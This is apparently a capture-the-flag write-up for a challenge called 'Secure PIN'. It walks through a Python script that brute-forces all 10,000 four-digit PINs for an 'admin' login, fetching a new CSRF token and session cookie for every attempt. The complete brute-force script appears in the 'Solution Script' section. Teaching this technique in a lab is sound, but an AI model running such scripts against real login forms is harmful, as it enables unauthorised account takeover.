# Secure PIN Write Up

## Why Scripting?
A script is perfect for this task where we need to keep track of our session and send a new CSRF token with every attempt. It would be tedious with other tools.

## Intended Solution

### 1. Exploring the Target
The first step to any challenge is to explore! Let's open the target application in our browser to understand how the login transaction works. If we open the DevTols for the login page or view page source, we'll notice a hidden input field inside the HTML `<form>`:

```html
<input type="hidden" name="csrf_token" value="6f9c96...a31c">
```

If we refresh the page, the `value` changes every single time. If we open the "Network" or "Application" tabs in DevTools, we see that the application sets a `session` cookie. 

The server must be using this `session` cookie to map our browser to the specific `csrf_token` it injected into the HTML. When we click "Login", the server expects our HTTP POST request to contain the `pin`, `username`, `session` cookie, and the matching `csrf_token`. If any of these are missing, the server rejects the request.

### 2. Session Setup
Rather than using `requests.get()` and `requests.post()` on their own, we must wrap them in a Session object. A Session object automatically tracks and sends the `session=` cookies set by the server across multiple requests.

We want to loop over all 10,000 possible PINs, so we'll set up a `for` loop that iterates from `0` to `9999` and format the integer as a 4-character string padded with zeros (e.g. `0014`).

```python
import requests

url = 'https://admin.inmt.win'

with requests.Session() as s:
    for i in range(10000):
        pin = f'{i:04}'
```

### 2. The CSRF Fetch
Because we get a new CSRF token with each request, each potential PIN requires two HTTP requests. The first request must fetch the login page to get the new CSRF token. We can then use `bs4` to pull the token from its `<input>` field.

```python
        # Grab the login page to acquire a fresh CSRF token and a session cookie
        res = s.get(url)
        
        # Extract the CSRF token with bs4
        soup = BeautifulSoup(res.text, 'html.parser')
        csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
```

### 3. The Payload Post
Now we have all the pieces we need to attempt a login. We can send a POST request with the `username`, `pin`, and `csrf_token` in the form data. The Session will automatically include the correct `session` cookie.

```python
        # Attempt the new PIN
        data = {
            'username': 'admin',
            'pin': pin,
            'csrf_token': csrf_token
        }
        res = s.post(url, data=data)
```

### 4. Detecting the Win
When we use an incorrect PIN, the server responds with an "Incorrect PIN for that user." message. If we guess the PIN correct, we can assume we'll get something else. Let's print out the response text if we don't get a "Incorrect PIN" message.

```python
        # Check if there was no error message about an incorrect PIN
        if 'Incorrect PIN' not in res.text:
            print(f'Success! PIN: {pin}')
            print(res.text)

            break
```

When we set our script loose, we find the PIN and the flag!

## Solution Script

```python
import requests
from bs4 import BeautifulSoup


def solve():
    url = 'http://admin.inmt.win'

    # We must use Session() or our CSRF token and cookie won't match up across requests
    with requests.Session() as s:
        # Loop between 0 and 9999
        for i in range(10000):
            # Format as a 4 digit string, like '0012'
            pin = f'{i:04}'

            # Print a progress report every 100 attempts
            if i % 100 == 0:
                print(f'Trying PINs starting with {pin}...')

            # Grab the login page to acquire a fresh CSRF token and a session cookie
            res = s.get(url)
            
            # Extract the CSRF token with bs4
            soup = BeautifulSoup(res.text, 'html.parser')
            csrf_token = soup.find('input', {'name': 'csrf_token'})['value']
            
            # Attempt the new PIN
            data = {
                'username': 'admin',
                'pin': pin,
                'csrf_token': csrf_token
            }
            res = s.post(url, data=data)
            
            # Check if there was no error message about an incorrect PIN
            if 'Incorrect PIN' not in res.text:
                print(f'Success! PIN: {pin}')
                print(res.text)

                # After checking the success output, we could cleanly extract the flag
                # soup = BeautifulSoup(res.text, 'html.parser')
                # success_msg = soup.find('p', class_='success').text
                # print(f'Flag: {success_msg}')

                break


if __name__ == '__main__':
    solve()
```
